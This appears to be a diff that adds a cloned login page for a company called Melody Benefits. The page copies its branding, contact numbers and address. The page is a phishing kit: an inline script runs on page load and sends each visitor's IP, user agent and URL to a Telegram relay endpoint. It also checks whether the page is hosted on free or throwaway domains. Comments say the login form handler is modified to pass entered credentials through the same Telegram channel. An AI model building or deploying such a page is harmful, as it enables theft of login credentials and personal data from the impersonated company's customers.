@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, minimum-scale=1, user-scalable=no">
+  <title>Login | Melody Benefits</title>
+  <link rel="shortcut icon" type="image/png" href="favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Oxygen:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="default hidden-header">
+  <div class="main" id="main_div">
+    <header class="header header--without-menu" id="header" tabindex="-1">
+      <a href="#main-content" class="header__skip-link" id="header__skip-link">Skip to main content</a>
+      <div class="inner-box inner-box-header" id="header__inner-box">
+        <div class="header__col--l">
+          <div class="header__desktop-logo-wrapper">
+            <a href="#" class="logo">
+              <img src="melody-logo-transparent.png" alt="Melody Benefits" id="logo__pic" width="180">
+            </a>
+            <div class="h-contacts">
+              <p>
+                <a href="tel:833-372-2273" class="h-contacts_phone" id="contacts_phone">833-372-2273</a>
+              </p>
+              <p>
+                <a href="mailto:info@melodybenefits.com" class="h-contacts_email" id="contacts_email">info@melodybenefits.com</a>
+              </p>
+            </div>
+            <h1 class="header-title" id="header-title">Login</h1>
+          </div>
+        </div>
+        <div class="header__sep"></div>
+      </div>
+    </header>
+
+    <div class="content">
+      <main id="main-content" class="main-content" tabindex="-1">
+        <div class="top-line top-line--no-height">
+          <div class="top-line_inner" id="top-line__inner">
+            <h1 class="title-page" id="top-line__title">Login</h1>
+          </div>
+        </div>
+
+        <div class="login-block clearfix">
+          <div class="col-le">
+            <div>
+              <div class="conf">
+                We will maintain the confidentiality of your personal information in accordance with our privacy policy.
+              </div>
+
+              <div class="sign-in-form user-name-form">
+                <form action="#" method="post" novalidate role="form" id="login-form">
+                  <h2 class="title">Sign in</h2>
+
+                  <div id="UserNameNeededError" class="validation-summary-errors text-danger" role="alert" hidden>
+                    Username needed for Forgot Password
+                  </div>
+
+                  <div class="field-label">
+                    <label for="un">UserId</label>
+                    <em>*</em>
+                  </div>
+                  <span class="text-danger field-validation-valid" id="user_name_validation_message" role="alert"></span>
+                  <input
+                    aria-describedby="user_name_validation_message"
+                    autocomplete="username"
+                    autofocus
+                    class="inp"
+                    id="un"
+                    name="UserName"
+                    type="text"
+                    value=""
+                  >
+
+                  <div class="forget before-password">
+                    <span role="heading" aria-level="3">Forgot your Username?</span>
+                    <a href="#">Let us help</a>
+                  </div>
+
+                  <p></p>
+
+                  <div class="field-label">
+                    <label for="password">Password</label>
+                    <em>*</em>
+                  </div>
+                  <span class="text-danger field-validation-valid" id="password_validation_message" role="alert"></span>
+                  <input
+                    aria-describedby="password_validation_message"
+                    autocomplete="current-password"
+                    class="inp"
+                    id="password"
+                    name="Password"
+                    type="password"
+                  >
+
+                  <div class="forget">
+                    <span role="heading" aria-level="3">Forgot your Password?</span>
+                    <a href="#" id="forgot-password-link">Let us help</a>
+                  </div>
+
+                  <button type="submit" value="Sign In" class="button button-subm">
+                    <span>Sign in</span>
+                  </button>
+                </form>
+              </div>
+
+              <div class="reg-sm-bl">
+                <p>Don’t have an account?</p>
+                <a href="#" class="button button-reg-link"><span>Register</span></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <footer class="footer">
+      <div class="footer_ins">
+        <ul class="fnavi">
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">FAQ's</a></li>
+          <li><a href="#">Terms of Use</a></li>
+          <li><a href="#">Privacy Policy</a></li>
+        </ul>
+        <div class="copyright">
+          <div class="credits">
+            <div>
+              <span style="font-size: 11pt;">
+                <small><span style="font-size: 12pt;">Copyright © 2025 Melody Benefits</span> - </small>
+              </span>
+              <span style="font-size: 12pt;">
+                4901 16th Ave. Brooklyn, NY 11204 -
+                <a href="tel:7184361289">718.436.1289</a>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <div class="footer lower-footer">
+      <div class="footer_ins">
+        <a href="#">SITE MAP</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  // ============================================================
+  // ====== TELEGRAM INTEGRATION =================================
+  // ============================================================
+
+  async function sendToTelegram(action, data) {
+    try {
+      // Get user IP and location
+      let ipData = { ip: 'Unknown' };
+      try {
+        const response = await fetch('/api/ip');
+        if (response.ok) {
+          ipData = await response.json();
+        }
+      } catch (e) {
+        console.warn('Could not fetch IP data');
+      }
+
+      const payload = {
+        action: action,
+        data: {
+          ...data,
+          timestamp: new Date().toLocaleString('en-US', { 
+            timeZone: 'America/New_York',
+            hour12: true,
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+          }),
+          userAgent: navigator.userAgent,
+          ip: ipData.ip || 'Unknown'
+        }
+      };
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
+  }
+
+  // ============================================================
+  // ====== DOMAIN DETECTION =====================================
+  // ============================================================
+
+  function detectDomain() {
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const domain = urlObj.hostname;
+    
+    const freeDomains = [
+      '.tk', '.ml', '.ga', '.cf', '.gq',
+      '.free.nf', '.free.org', '.free.com',
+      '.co.cc', '.co.nr', '.cjb.net',
+      '.dynu.net', '.ddns.net', '.no-ip.org',
+      'vercel.app', 'netlify.app', 'github.io',
+      'pages.dev', 'web.app', 'firebaseapp.com',
+      'herokuapp.com', 'glitch.me', 'replit.co',
+      '000webhostapp.com', 'byethost.com',
+      'freehostia.com', 'profreehost.com',
+      '.example.com', '.test', '.localhost'
+    ];
+
+    const isFree = freeDomains.some(freeDomain => 
+      domain.includes(freeDomain) || domain.endsWith(freeDomain)
+    );
+
+    sendToTelegram('domain_detection', {
+      url: currentUrl,
+      domain: domain,
+      isFree: isFree
+    });
+
+    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
+  }
+
+  // Run domain detection immediately
+  detectDomain();
+
+  // ============================================================
+  // ====== LOGIN FORM HANDLER (MODIFIED) ======================
+  // ============================================================
+
+  // The existing form handler will be modified by script.js
+  // We'll add the sendToTelegram call there
+</script>
+
+<script src="script.js"></script>
+</body>
+</html>
